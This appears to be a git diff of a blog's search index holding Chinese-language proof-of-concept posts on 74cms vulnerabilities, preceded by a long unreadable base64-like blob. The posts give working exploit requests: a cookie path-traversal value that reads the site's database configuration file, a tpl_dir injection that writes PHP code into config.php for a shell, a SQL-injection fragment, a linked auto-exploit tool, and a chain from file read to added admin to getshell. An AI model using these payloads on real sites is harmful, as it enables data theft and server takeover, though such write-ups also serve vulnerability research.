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 </div>]]></content>
       <categories>
         <category>Poc</category>
       </categories>
       <tags>
         <tag>ApacheMQ</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>74cms v4.2.126-任意文件读取漏洞</title>
+    <url>/2021/01/12/74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<a id="more"></a>
+<h1 id="74cms-v4-2-126-任意文件读取漏洞"><a href="#74cms-v4-2-126-任意文件读取漏洞" class="headerlink" title="74cms v4.2.126-任意文件读取漏洞"></a>74cms v4.2.126-任意文件读取漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
+<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a href="http://baidu.com/">http://baidu.com</a> 即可</p>
+<h2 id="0x02-任意文件读取漏洞演示"><a href="#0x02-任意文件读取漏洞演示" class="headerlink" title="0x02 任意文件读取漏洞演示"></a>0x02 任意文件读取漏洞演示</h2><pre><code>url: http://74cms.test/index.php?m=Home&amp;c=Members&amp;a=register
+
+post: 
+reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind
+cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php;members_bind_info[type]=qq;members_uc_info[password]=123456;members_uc_info[uid]=1;members_uc_info[username]=tttttt;
+headers:
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest</code></pre>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>问题一：漏洞原理？我下面会讲问题二：你如何知道文件名称的？我下面会讲问题三：能不能写个简单的工具，自动利用此漏洞？哦，好的，我下面会提供 : )</p>
+<h2 id="0x03-漏洞讲解"><a href="#0x03-漏洞讲解" class="headerlink" title="0x03 漏洞讲解"></a>0x03 漏洞讲解</h2><p>打开文件：74cms\upload\Application\Home\Controller\MembersController.class.php函数：_save_avatar($avatar, $uid)</p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<p>如果不想看图片注释的话，我这里简单的说一下。812行使用$avatar拼接形成$path830行使用了$save_avatar+$savePicName; 生成了$filename838行，使用了copy函数，把$path文件内容复制到了$filename中。而 $avatar 和 $uid 都是我们刚好可以控制的变量并且生成的文件名称是$uid+time() 然后md5 一下 拼接 .jpg这个情况就很舒服了。写个小工具跑一下就好了，小工具会在结尾的时候放出来的。好了，让我们继续看下去 : )我们现在既然已经知道了_save_avatar<br>函数是有可能造成此漏洞的那么这时，我们就需要去找调用它的地方了。经过一顿的搜索我们得出了两个地方是调用了他地方一：register() 方法 会员注册方法地方二：oauth_reg() 方法 第三方登录注册方法论此漏洞的利用当然是register() 方法利用起来比较简单 因为 方法二<br>需要搭建第三方登录，我本地的话。。。还是算了，这里掩饰我使用 方法一打开文件：74cms\upload\Application\Home\Controller\MembersController.class.php函数：register()</p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
+<p>上面的马赛克是因为我写错了几个字，又不想重新写，所以我就把他擦掉了。皮这一下，我就很开心</p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
+<p>这里我们讲解一下如果<br>post的变量ucenter为bind时，则通过cookie获取数组$uc_user接着会进行数组合并而members_uc_info的cookie值是可控的，所以$data也是可控的。</p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
+<p>这里写着 当 $data[utype] = 1<br>会进行用户注册，而$data[utype]是我们可以控制的所以我们为2绕过此判断这里我又跳过了前面一些无关紧要的内容，来到了最后的漏洞触发点。因为真的无关紧要,所以就跳过了</p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
+<h2 id="0x04-漏洞利用小工具"><a href="#0x04-漏洞利用小工具" class="headerlink" title="0x04 漏洞利用小工具"></a>0x04 漏洞利用小工具</h2><p><a href="https://github.com/ianxtianxt/74cms-upload">https://github.com/ianxtianxt/74cms-upload</a></p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/dr895b">https://www.yuque.com/pmiaowu/bfgkkh/dr895b</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>74cms</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>74cms v4.2.1-v4.2.129-后台getshell漏洞</title>
+    <url>/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<a id="more"></a>
+
+<h1 id="74cms-v4-2-1-v4-2-129-后台getshell漏洞"><a href="#74cms-v4-2-1-v4-2-129-后台getshell漏洞" class="headerlink" title="74cms v4.2.1-v4.2.129-后台getshell漏洞"></a>74cms v4.2.1-v4.2.129-后台getshell漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
+<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a href="http://baidu.com/">http://baidu.com</a> 即可</p>
+<h2 id="0x02漏洞演示"><a href="#0x02漏洞演示" class="headerlink" title="0x02漏洞演示"></a>0x02漏洞演示</h2><p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<pre><code>url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= &#39;, &#39;a&#39;,phpinfo(),&#39;
+
+shell:http://74cms.test/Application/Home/Conf/config.php
+路径：\74cms\upload\Application\Home\Conf\config.php</code></pre>
+<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><pre><code>url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= &#39;, &#39;a&#39;,phpinfo(),&#39;
+路径：74cms\upload\Application\Admin\Controller\TplController.class.php</code></pre>
+<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
+<pre><code>路径： 74cms\upload\Application\Common\Controller\BackendController.class.php</code></pre>
+<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<h2 id="0x04题外话-认真版getshell方法"><a href="#0x04题外话-认真版getshell方法" class="headerlink" title="0x04题外话-认真版getshell方法"></a>0x04题外话-认真版getshell方法</h2><p>认真版getshell方法：实际上想要进行getshell利用组合漏洞是很简单的事情。我的前台日到后台的getshell方法是这样的。首先利用-任意文件读取漏洞-读取系统中的hash值然后在通过漏洞-前台sql注入-来插入用户数据-因为我发现他可以支持执行双语句所以可以执行mysql双语句插入一条管理员用户在通过这个后台getshell漏洞即可完成一套日穿</p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/wecilm">https://www.yuque.com/pmiaowu/bfgkkh/wecilm</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>74cms</tag>
       </tags>
   </entry>
   <entry>
@@ -156,80 +230,6 @@ members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select us
       </tags>
   </entry>
   <entry>
-    <title>74cms v4.2.1-v4.2.129-后台getshell漏洞</title>
-    <url>/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h1 id="74cms-v4-2-1-v4-2-129-后台getshell漏洞"><a href="#74cms-v4-2-1-v4-2-129-后台getshell漏洞" class="headerlink" title="74cms v4.2.1-v4.2.129-后台getshell漏洞"></a>74cms v4.2.1-v4.2.129-后台getshell漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
-<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a href="http://baidu.com/">http://baidu.com</a> 即可</p>
-<h2 id="0x02漏洞演示"><a href="#0x02漏洞演示" class="headerlink" title="0x02漏洞演示"></a>0x02漏洞演示</h2><p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
-<pre><code>url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= &#39;, &#39;a&#39;,phpinfo(),&#39;
-
-shell:http://74cms.test/Application/Home/Conf/config.php
-路径：\74cms\upload\Application\Home\Conf\config.php</code></pre>
-<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
-<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
-<h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><pre><code>url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= &#39;, &#39;a&#39;,phpinfo(),&#39;
-路径：74cms\upload\Application\Admin\Controller\TplController.class.php</code></pre>
-<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
-<pre><code>路径： 74cms\upload\Application\Common\Controller\BackendController.class.php</code></pre>
-<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
-<h2 id="0x04题外话-认真版getshell方法"><a href="#0x04题外话-认真版getshell方法" class="headerlink" title="0x04题外话-认真版getshell方法"></a>0x04题外话-认真版getshell方法</h2><p>认真版getshell方法：实际上想要进行getshell利用组合漏洞是很简单的事情。我的前台日到后台的getshell方法是这样的。首先利用-任意文件读取漏洞-读取系统中的hash值然后在通过漏洞-前台sql注入-来插入用户数据-因为我发现他可以支持执行双语句所以可以执行mysql双语句插入一条管理员用户在通过这个后台getshell漏洞即可完成一套日穿</p>
-<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
-<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/wecilm">https://www.yuque.com/pmiaowu/bfgkkh/wecilm</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Poc</category>
-      </categories>
-      <tags>
-        <tag>74cms</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>74cms v4.2.126-任意文件读取漏洞</title>
-    <url>/2021/01/12/74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<a id="more"></a>
